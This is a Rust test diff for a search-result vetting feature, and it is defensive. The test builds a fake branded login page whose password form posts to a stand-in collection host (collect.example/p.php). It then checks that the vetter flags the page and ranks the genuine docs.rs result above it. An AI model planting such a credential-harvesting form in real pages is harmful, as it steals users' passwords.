@@ -1285,3 +1285,42 @@ async fn without_a_vet_nothing_changes() {
     assert_eq!(resp.hits.len(), 1);
     assert!(resp.hits[0].vet.is_none());
 }
+
+#[tokio::test]
+async fn a_page_that_collects_a_brand_login_falls_behind_after_it_is_read() {
+    let kit = "https://camp-7.pages.dev/tokio";
+    let honest = "https://docs.rs/tokio";
+    let a = FakeSource::ok(
+        "a",
+        vec![
+            hit(
+                kit,
+                "Tokio runtime",
+                "Tokio is an asynchronous runtime for Rust",
+            ),
+            hit(
+                honest,
+                "Tokio runtime",
+                "Tokio is an asynchronous runtime for Rust",
+            ),
+        ],
+    );
+    let trap = page("PayPal Tokio runtime", &RUNTIME).replace(
+        "</body>",
+        r#"<form action="https://collect.example/p.php"><input type="password" name="p"></form></body>"#,
+    );
+    let pages = FakePages::new(&[(kit, trap), (honest, page("Tokio runtime", &RUNTIME))]);
+    let p = vetted(vec![a], pages);
+    let resp = p
+        .search(&SearchRequest::new("tokio runtime"))
+        .await
+        .unwrap();
+    let k = resp.hits.iter().find(|h| h.url == kit).unwrap();
+    let flags = &k.vet.as_ref().expect("flagged").flags;
+    assert!(
+        flags.iter().any(|f| f == "form_elsewhere")
+            && flags.iter().any(|f| f == "brand_login_page"),
+        "{flags:?}"
+    );
+    assert_eq!(resp.hits[0].url, honest, "{:#?}", resp.hits);
+}
